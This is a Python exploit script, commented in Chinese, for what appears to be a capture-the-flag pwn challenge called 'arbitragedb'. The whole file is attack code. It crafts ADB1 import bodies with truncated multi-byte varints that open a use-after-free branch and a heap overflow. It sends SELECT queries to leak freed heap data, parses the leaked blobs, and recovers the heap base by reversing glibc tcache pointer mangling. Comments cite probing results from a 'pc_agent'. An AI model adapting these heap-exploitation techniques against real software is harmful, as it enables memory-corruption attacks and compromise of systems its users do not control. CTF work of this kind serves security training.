#!/usr/bin/env python3
"""
Pwn/arbitragedb — Stage 1：leak 取得腳本（本地先跑，確認 UAF leak 成立）

用法（Linux）：
    python3 stage1.py            > s1.txt   # 產生輸入
    ./arbitragedb formal_state   < s1.txt   # 或用 run() 直接互動

四組參數都已用 simulate() 靜態驗證可達（見 __main__ 的自我檢查）。
"""
import sys, struct, subprocess

def lv(n: int) -> bytes:
    """LEB128 varint"""
    o = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        o.append(b | (0x80 if n else 0))
        if not n:
            return bytes(o)


def build(v1=1, v2=0, v3=0, payload=b"") -> bytes:
    """ADB1 body：16B header + varint v1/v2/v3 + payload"""
    return b"ADB1" + b"\x00" * 12 + lv(v1) + lv(v2) + lv(v3) + payload


def _dec(buf):
    """sub_44bb：LEB128，最多 10 bytes"""
    val = sh = 0
    for i, b in enumerate(buf[:10]):
        val |= (b & 0x7F) << sh
        if not (b & 0x80):
            return val, i + 1
        sh += 7
    return None, None


def _s4566(buf):
    """
    sub_4566 —— ★ 關鍵：多 byte varint 時只回首 byte 的低 7 bits
      if adv > 1 and (buf[0] & 0x80): return buf[0] & 0x7f
    off 前進量仍是完整 byte 數（與截斷無關）。
    """
    val, adv = _dec(buf)
    if val is None:
        return 0, 0
    if adv > 1 and (buf[0] & 0x80):
        return buf[0] & 0x7F, adv
    return val, adv


def analyze(v1, v2, v3, payload):
    """
    靜態重現 sub_4988 + sub_4604。
      arg4 = _s4566(varint2)  -> alloc, rec[0x28]
      arg5 = varint3 完整值   -> 受 <=0x80 檢查, copylen=max(remaining,arg5)
      UAF 分支條件: arg4 != arg5   (0x47f1)
    """
    body = build(v1, v2, v3, payload)
    size = len(body)
    off  = 0x10 + len(lv(v1))
    arg4, adv2 = _s4566(body[off:]); off += adv2
    arg5, adv3 = _dec(body[off:]);   off += adv3
    remaining  = size - off
    ok = (0 <= size <= 0x4000) and size > 0x11 and off < size and arg5 <= 0x80
    alloc   = min(arg4 + 0x18, 0x1000)
    copylen = max(remaining, arg5)
    return {
        "size": size, "off": off, "remaining": remaining,
        "arg4": arg4, "arg5": arg5,
        "alloc": alloc, "copylen": copylen,
        "overflow": copylen - alloc,
        "uaf_branch": arg4 != arg5,
        "accepted": ok,
    }


def cmd_import(name: bytes, body: bytes) -> bytes:
    return b"IMPORT %s FORMAT ADB1 SIZE %d\n" % (name, len(body)) + body


# ── 參數組（varint2 / varint3；已依 sub_4566 截斷語意重算）────────
# ★ UAF 閘門 = (arg4 != arg5)，而 arg4 只有在 varint2 >= 0x80（多 byte）時才被
#   截斷成 firstbyte&0x7f。pc_agent 試的 {0,1,2,0x40,0x7f} 全是單 byte，
#   所以 arg4==varint2，永遠開不了 UAF。
UAF      = dict(v1=1, v2=0xFF,   v3=0,    payload=b"L" * 0x20)   # arg4=127 arg5=0 不溢出
UAF2     = dict(v1=1, v2=0x3FFF, v3=1,    payload=b"L" * 0x40)   # arg4=127 arg5=1
# 溢出：pc_agent 實測旋鈕是 alloc-size 欄位 >= 0x80 → malloc(): corrupted top size
OVERFLOW = dict(v1=1, v2=0x80,   v3=0x80, payload=b"A" * 0x200)
# 大 payload（原 gen_poc 的想法，pc_agent 實測不會 crash，保留作對照）
BIGPAY   = dict(v1=1, v2=0,      v3=0,    payload=b"A" * 0x2000)

def stage1() -> bytes:
    """
    最小 leak 探測。
    SELECT 語法（pc_agent 實測）：必須含字面 ';'，且不可含 "SELECT 1"
    （"SELECT 1" 是 0x5482 的捷徑，只印假的 ROW int:1，會蓋掉真資料）
    """
    q = b"SELECT * FROM sys_imports;\n"
    out  = cmd_import(b"t1", build(**UAF))
    out += q
    out += cmd_import(b"t2", build(**UAF2))
    out += q
    out += b"QUIT\n"
    return out


def parse_blob(text: str):
    """從輸出裡抓 blob:<len>:<hex> 並轉成 8-byte qword 列表"""
    import re
    res = []
    for m in re.finditer(r"blob:(\d+):([0-9a-f]*)", text):
        n, hx = int(m.group(1)), m.group(2)
        raw = bytes.fromhex(hx)
        qs = [struct.unpack_from("<Q", raw, i)[0]
              for i in range(0, len(raw) - 7, 8)]
        res.append((n, raw, qs))
    return res


def demangle(mangled: int, chunk_addr: int) -> int:
    """glibc tcache pointer mangling: stored = (chunk>>12) ^ next"""
    return mangled ^ (chunk_addr >> 12)


def recover_heap_base(mangled: int) -> int:
    """
    只給 mangled fd 時反推 heap base。
    mangled = (chunk>>12) ^ next；若 next==0（tcache 只有一顆），
    mangled 就直接是 chunk>>12 → heap page 位址。
    """
    return mangled << 12


if __name__ == "__main__":
    for nm, p in [("UAF", UAF), ("UAF2", UAF2),
                  ("OVERFLOW", OVERFLOW), ("BIGPAY", BIGPAY)]:
        a = analyze(**p)
        assert a["accepted"], f"{nm} 會被程式拒絕: {a}"
        print("[%-8s] size=0x%-5x arg4=%-4d arg5=%-4d alloc=0x%-5x copylen=0x%-5x "
              "ovf=%+#7x uaf=%s"
              % (nm, a["size"], a["arg4"], a["arg5"], a["alloc"],
                 a["copylen"], a["overflow"], a["uaf_branch"]),
              file=sys.stderr)

    # UAF 兩組必須真的開啟分支且不溢出
    for nm in ("UAF", "UAF2"):
        a = analyze(**globals()[nm])
        assert a["uaf_branch"], f"{nm} 沒開啟 UAF 分支"
        assert a["overflow"] <= 0, f"{nm} 不該溢出"

    # 交叉驗證：pc_agent 測過的單 byte 參數必須走 inline（uaf=False）
    for v in (0, 1, 2, 0x40, 0x7F):
        a = analyze(v1=1, v2=v, v3=v, payload=b"X" * 0x20)
        assert not a["uaf_branch"], f"單byte v={v} 不該開 UAF（與 pc_agent 實測矛盾）"
    print("[*] 自我檢查通過：UAF 需多 byte varint；單 byte 全走 inline（符合 pc_agent 實測）",
          file=sys.stderr)

    sys.stdout.buffer.write(stage1())
